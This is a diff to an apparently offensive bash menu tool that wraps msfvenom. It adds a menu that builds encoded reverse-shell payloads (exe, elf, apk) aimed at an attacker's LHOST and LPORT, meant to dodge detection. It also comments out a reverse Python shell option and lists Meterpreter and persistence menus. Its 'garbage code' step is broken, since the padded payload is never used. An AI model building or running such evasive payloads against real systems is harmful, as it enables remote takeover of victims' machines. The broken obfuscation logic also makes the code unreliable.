@@ -132,6 +132,102 @@ badbye()
 }
 
 ################################################################################
+# Obfuscate Payloads Menu
+################################################################################
+obfuscate() {
+encodemenu:
+    clear
+    echo    
+    echo
+    while true; do
+        echo "${GREEN}  1. Obfuscate Payload"
+        echo "  q. Quit"
+        echo ${YELLOW}
+        read -n1 -p "  What do you want to do? Choose: [1,q] " opt
+
+        case $opt in
+            1)
+                goto encode;
+                ;;
+            q)
+                goto $start
+                ;;
+            *)
+                echo "Invalid choice. Please choose 1 or q."
+                ;;
+        esac
+    done
+
+encode:
+    echo
+    echo 
+    echo "  ${FGC}${GREEN} Payload Obfuscation ${NC}${YELLOW}"
+    echo "  --------------------"
+    echo
+    echo "  ${GREEN} I need to collect some input for the payload parameters"${NC}    
+    echo
+    pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+    
+    # Get the parameters for the payload
+    echo ${YELLOW}
+    read -p "  Enter the payload to obfuscate: " payload
+    read -p "  Enter the output format (e.g., exe, elf, apk): " format
+    read -p "  Enter the output file name: " output
+    read -p "  Enter the LHOST for the payload: " lhost
+    read -p "  Enter the LPORT for the payload: " lport
+    
+    echo
+    echo "  Please wait while I validate your input parameters and get available payloads ..." | fmt -w 60
+    echo
+
+    # Check if the payload is valid
+    if ! msfvenom -l payloads | grep -q $payload; then
+        echo "  Error: Invalid payload."
+        return
+    fi
+
+    # Check if the format is valid
+    if ! msfvenom -l formats | grep -q $format; then
+        echo "  Error: Invalid format."
+        return
+    fi
+
+    # Display available encoders
+    echo "  ${FGC}Available Encoders:${NC}${YELLOW}"
+    msfvenom -l encoders | grep -E '^\s+' | sed 's/^\s*//'
+
+    read -p "  Enter the encoder to use (e.g., x86/xor, press Enter to skip): " encoder
+
+    # Check if the encoder is valid
+    if [ ! -z "$encoder" ] && ! msfvenom -l encoders | grep -q $encoder; then
+        echo "  Error: Invalid encoder."
+        return
+    fi
+
+    # Modify the payload with garbage code
+    echo "  Generating garbage code and concatenating to payload"
+    garbage_code=$(openssl rand -hex 32)
+    modified_payload="${payload}${garbage_code}"
+
+    # Generate the obfuscated payload
+    echo "  Generating obfuscated payload..."
+    if [ -z "$encoder" ]; then
+        msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $format -o $output.$format >/dev/null 2>&1
+    else
+        msfvenom -p $payload LHOST=$lhost LPORT=$lport -e $encoder -f $format -o $output.$format >/dev/null 2>&1
+    fi
+
+    if [ $? -eq 0 ]; then
+        echo "  Obfuscated payload saved to: $output.$format"
+        sleep 5
+        goto encodemenu;
+    else
+        echo "  Error: Failed to obfuscate payload."
+        goto encodemenu;
+    fi
+}
+
+################################################################################
 # Payloads Menu
 ################################################################################
 payloads()
@@ -162,15 +258,15 @@ payloads()
    echo "	  |    🍎${GREEN} 3 ${BLUE}Mac OSX Reverse TCP.                ${YELLOW}|"
    echo "	  |---------------------------------------------|"
    echo "	  |    🤖${GREEN} 4 ${BLUE}Android Meterpreter Reverse TCP.    ${YELLOW}|"
-   echo "	  |---------------------------------------------|"
-   echo "	  |    🐍${GREEN} 5 ${BLUE}Unix Reverse Python.                ${YELLOW}|"
+#   echo "	  |---------------------------------------------|"
+#   echo "	  |    🐍${GREEN} 5 ${BLUE}Unix Reverse Python.                ${YELLOW}|"
    echo "	  |---------------------------------------------|"
    echo "	  |    🚪${GREEN} q ${BLUE}Quit to main menu.                  ${YELLOW}|"
    echo "	  |_____________________________________________${YELLOW}|${GREEN}"
    echo	
    errors
    echo "${GREEN}"
-   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,5,q]    " opt
+   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,q]    " opt
    echo
    echo
    locals
@@ -203,17 +299,17 @@ payloads()
           pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
           goto pay;
 	;;  
-	5)
-	  echo
-          echo "         ${FGC}    Crafting a Reverse Python Payload  :   ${NC}${YELLOW}"
-	  read -p '	    Set Attacker IP* ' attackerip
-    	  read -p '	    Set Attacker Port* ' attackerport
-	  echo "	    💰💰💰 Generating reverse python payload ..."	
-	  msfvenom -p cmd/unix/reverse_python LHOST=$attackerip LPORT=$attackerport -f raw > $wdir/shell.py
-	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell.py saved   💰💰💰   ${NC}${GREEN}"
-          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
-          goto pay;
-	;;
+	#5)
+	  #echo
+          #echo "         ${FGC}    Crafting a Reverse Python Payload  :   ${NC}${YELLOW}"
+	  #read -p '	    Set Attacker IP* ' attackerip
+    	  #read -p '	    Set Attacker Port* ' attackerport
+	  #echo "	    💰💰💰 Generating reverse python payload ..."	
+	  #msfvenom -p cmd/unix/reverse_python LHOST=$attackerip LPORT=$attackerport -f raw > $wdir/shell.py
+	  #echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell.py saved   💰💰💰   ${NC}${GREEN}"
+          #pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+          #goto pay;
+	#;;
         q)
           clear
           goto $start
@@ -766,7 +862,7 @@ function pause(){
    echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
    sleep .1
    echo -ne '   👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽👽\r'
-   echo -ne '                    🕵🔎 Courtesy of KaotickJ 👽\r'${NC}
+   echo -ne '                 🕵🔎 Courtesy of Kaotick Jay 👽\r'${NC}
    #	echo "			🖥️ 🐧🍎🤖🐍♻🐚		  "
    sleep .5
    echo "${LIGHT_MAGENTA}  "
@@ -790,6 +886,8 @@ function pause(){
    echo "	  |---------------------------------------------|"
    echo "	  |    ⌛${GREEN} 4 ${BLUE}Persistence Scripts menu.           ${YELLOW}|"
    echo "	  |---------------------------------------------|"
+   echo "	  |    ▶️ ${GREEN} 5 ${BLUE}Generate an Obfuscated Payload.     ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
    echo "	  |    ▶️ ${GREEN} M ${BLUE}Migrate to Msfconsole.              ${YELLOW}|"
    echo "	  |---------------------------------------------|"
    echo "	  |    🚪${GREEN} q ${BLUE}Quit.                               ${YELLOW}|"
@@ -808,6 +906,8 @@ function pause(){
        3) malexe
          ;;
        4) persist
+         ;;
+       5) obfuscate
          ;;
        M) mfconsole
          ;;
